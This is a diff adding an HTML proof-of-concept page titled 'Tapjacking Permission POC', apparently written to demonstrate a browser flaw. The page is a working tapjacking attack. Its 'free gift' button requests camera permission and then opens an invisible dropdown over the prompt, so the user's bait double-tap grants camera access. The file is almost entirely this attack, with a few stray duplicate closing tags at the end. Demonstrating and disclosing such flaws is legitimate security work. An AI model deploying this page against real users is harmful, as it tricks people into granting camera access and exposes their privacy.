@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Tapjacking Permission POC</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+  <style>
+    body {
+      margin: 0;
+      height: 100vh;
+      overflow: hidden;
+      text-align: center;
+      margin: 30vh 10vw;
+      background-color: #7242E3;
+    }
+
+    button {
+      font-size: 25px;
+      background-color: #28a745;
+      color: white;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+
+    select {
+      opacity: 0;
+    }
+  </style>
+  <script>
+
+    function requestCameraPermission() {
+      // Get access to the camera
+      navigator.mediaDevices.getUserMedia({ video: true })
+        .then(function (stream) {
+          console.log('Camera permission granted.');
+        })
+        .catch(function (error) {
+          console.error('Error accessing the camera:', error);
+        });
+    }
+
+    function handleClick() {
+        requestCameraPermission();
+        setTimeout(function() {
+          document.getElementById("selectme").showPicker();
+            }, 250);
+      }
+
+  </script>
+</head>
+<body>
+<center>
+    <button onclick="handleClick()">ð Click to Open Your Lucky Ticket and Double-Tap [&#x1F7E9; = ð] the Green Box to Win a Free Gift! ð</button>
+
+</center>
+    
+    
+    
+  <div>
+    <select id="selectme" ondblclick="handleDoubleClick()">
+      <option>&#x1F7E5;&emsp;&#x1F7E5;&emsp;&#x1F7E5;&emsp;&#x1F7E5;&emsp;&#x1F7E5;&emsp;&#x1F7E5;&emsp;&#x1F7E5;&emsp;&#x1F7E5;</option>
+      <option>&#x1F7E5;&emsp;&#x1F7E5;&emsp;&#x1F7E5;&emsp;&#x1F7E5;&emsp;&#x1F7E5;&emsp;&#x1F7E5;&emsp;&#x1F7E5;&emsp;&#x1F7E5;</option>
+      <option>&#x1F7E5;&emsp;&#x1F7E5;&emsp;&#x1F7E5;&emsp;&#x1F7E5;&emsp;&#x1F7E5;&emsp;&#x1F7E5;&emsp;&#x1F7E5;&emsp;&#x1F7E5;</option>
+      <option>&#x1F7E5;&emsp;&#x1F7E5;&emsp;&#x1F7E5;&emsp;&#x1F7E5;&emsp;&#x1F7E5;&emsp;&#x1F7E5;&emsp;&#x1F7E5;&emsp;&#x1F7E5;</option>
+      <option>&#x1F7E5;&emsp;&#x1F7E5;&emsp;&#x1F7E5;&emsp;&#x1F7E5;&emsp;&#x1F7E5;&emsp;&#x1F7E5;&emsp;&#x1F7E5;&emsp;&#x1F7E5;</option>
+      <option>&#x1F7E5;&emsp;&#x1F7E5;&emsp;&#x1F7E5;&emsp;&#x1F7E5;&emsp;&#x1F7E5;&emsp;&#x1F7E5;&emsp;&#x1F7E5;&emsp;&#x1F7E5;</option>
+      <option>&#x1F7E5;&emsp;&#x1F7E5;&emsp;&#x1F7E5;&emsp;&#x1F7E5;&emsp;&#x1F7E5;&emsp;&#x1F7E9;&emsp;&#x1F7E5;&emsp;&#x1F7E5;</option>
+      <option>&#x1F7E5;&emsp;&#x1F7E5;&emsp;&#x1F7E5;&emsp;&#x1F7E5;&emsp;&#x1F7E5;&emsp;&#x1F7E5;&emsp;&#x1F7E5;&emsp;&#x1F7E5;</option>
+      <option>&#x1F7E5;&emsp;&#x1F7E5;&emsp;&#x1F7E5;&emsp;&#x1F7E5;&emsp;&#x1F7E5;&emsp;&#x1F7E5;&emsp;&#x1F7E5;&emsp;&#x1F7E5;</option>
+      <option>&#x1F7E5;&emsp;&#x1F7E5;&emsp;&#x1F7E5;&emsp;&#x1F7E5;&emsp;&#x1F7E5;&emsp;&#x1F7E5;&emsp;&#x1F7E5;&emsp;&#x1F7E5;</option>
+      <option>&#x1F7E5;&emsp;&#x1F7E5;&emsp;&#x1F7E5;&emsp;&#x1F7E5;&emsp;&#x1F7E5;&emsp;&#x1F7E5;&emsp;&#x1F7E5;&emsp;&#x1F7E5;</option>
+      <option>&#x1F7E5;&emsp;&#x1F7E5;&emsp;&#x1F7E5;&emsp;&#x1F7E5;&emsp;&#x1F7E5;&emsp;&#x1F7E5;&emsp;&#x1F7E5;&emsp;&#x1F7E5;</option>
+      <option></option>
+    </select>
+  </div>
+
+</body>
+
+</html>    
+  </select>
+</div>
+
+</body>
+</html>
